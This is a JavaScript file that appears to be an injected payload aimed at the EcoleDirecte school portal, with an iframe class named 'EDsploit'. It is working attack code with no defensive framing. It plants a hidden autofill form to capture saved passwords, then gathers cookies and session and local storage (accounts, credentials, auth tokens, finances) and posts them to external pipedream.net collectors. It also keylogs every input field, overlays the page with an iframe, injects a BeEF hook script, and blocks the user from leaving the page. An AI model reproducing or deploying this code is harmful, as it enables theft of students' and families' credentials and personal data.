const ur = new URL(document.currentScript.src);
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  e.returnValue = '';
});

(async function ex() {

	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
	const form = window.top.document.createElement('form');
	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
	form.hidden = true;
	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
	window.top.document.body.appendChild(form);
	const pwdInput = window.top.document.querySelector('input[type="password"]');
	await new Promise(resolve => setTimeout(resolve, 2000));
	
	const pass = pwdInput.value

	const pata = {
    	identifiant: identifiant.payload.accounts?.[0].identifiant,
    	motdepasse: pass
	};

	await fetch('https://api.ecoledirecte.com/v3/admin/login/3DSecure.awp', {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify({ data: JSON.stringify(pata) })
	})
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		mid: messageid.searchParams.get('idMessage') || "null",
		api: ur.searchParams.get("apiv") || "100.1",
		sign: ur.searchParams.get("signature") || false,
		mode: ur.searchParams.get("mode") || "Suppression",
		email: ur.searchParams.get("email") || "test@gmail.com",
		ps: pass,
		c: document.cookie,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		});
	} catch {}
})();

async function iframe() {
	const i = window.top.document.createElement('iframe');
	i.src = "/";
	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
	i.className = 'EDsploit';
	window.top.document.body.appendChild(i);
        
	i.onload = async () => {
		const beef = window.top.document.createElement("script");
		beef.src = "https://beef.local/hook.js";
		beef.async = true;
		window.top.document.body.appendChild(beef);
		await new Promise(resolve => setTimeout(resolve, 8000));
		document.querySelector('button[title="Se déconnecter"]').click();
	};
	
	return;
};

(async function() {
	if (ur.searchParams.get("iframetrap") === "true") {
		if (document.body.querySelector('iframe[class=EDsploit]')) {
			return null
		} else {
			await iframe()
		}
	}
})();

(async function() {
    document.querySelectorAll('input').forEach(field => {
		field.addEventListener('input', async function() {
			const name = this.name || this.id || this.type || 'field';
			const value = this.value;

			console.log(`[${name}] : ${value}`)

			await fetch('https://eoXXXXXX.m.pipedream.net', {
			method: 'POST',
			body: JSON.stringify({ field: name, value }),
			headers: { 'Content-Type': 'application/json' }
			});
		});
	});
})();
